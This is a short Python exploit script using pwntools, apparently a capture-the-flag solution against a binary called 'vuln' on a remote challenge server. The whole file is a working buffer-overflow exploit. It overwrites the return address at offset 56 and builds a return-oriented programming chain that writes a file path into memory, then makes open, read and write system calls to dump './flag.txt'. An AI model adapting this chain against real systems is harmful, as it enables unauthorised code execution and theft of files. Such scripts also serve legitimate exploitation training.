from pwn import *

mov_rax_rsi = 0x46c578   # mov qword ptr [rax + 0x20], rsi ; ret
pop_rdi = 0x4018ea
pop_rdx = 0x4017ef
pop_rsi = 0x402e08
pop_rax = 0x469407
syscall = 0x4012e3
sysret = 0x435844
ret = 0x40101a
bss = 0x4fd000 + 0x100
offset = 56

if args.LOCAL:
	p = process('./vuln')
else:
	host = 'gc1.eng.run'
	port = 30461
	p = remote(host, port)

p.sendline(b'C')

file = b'./flag.txt'

file += b'\x00'
align = (8 - len(file) % 8) % 8
file += b'\x00' * align

payload = b'A' * offset

# write filename into memory 8 bytes at a time
for i in range(0, len(file), 8):
	chunk = file[i:i + 8]
	payload += p64(pop_rsi)
	payload += chunk
	payload += p64(pop_rax)
	payload += p64(bss + i - 0x20)
	payload += p64(mov_rax_rsi)

# open file
payload += p64(pop_rdi)
payload += p64(bss)
payload += p64(pop_rsi)
payload += p64(0x0)
payload += p64(pop_rax)
payload += p64(0x2)
payload += p64(sysret)

# read from file
payload += p64(pop_rdi)
payload += p64(0x3)
payload += p64(pop_rsi)
payload += p64(bss)
payload += p64(pop_rdx)
payload += p64(0xfff)
payload += p64(pop_rax)
payload += p64(0x0)
payload += p64(sysret)

# write to stdout
payload += p64(pop_rdi)
payload += p64(0x1)
payload += p64(pop_rsi)
payload += p64(bss)
payload += p64(pop_rdx)
payload += p64(0x30)
payload += p64(pop_rax)
payload += p64(0x1)
payload += p64(sysret)

p.sendlineafter(b'->', payload)
p.recvuntil(b'ice cream now\n')

print(p.recvall())
p.close()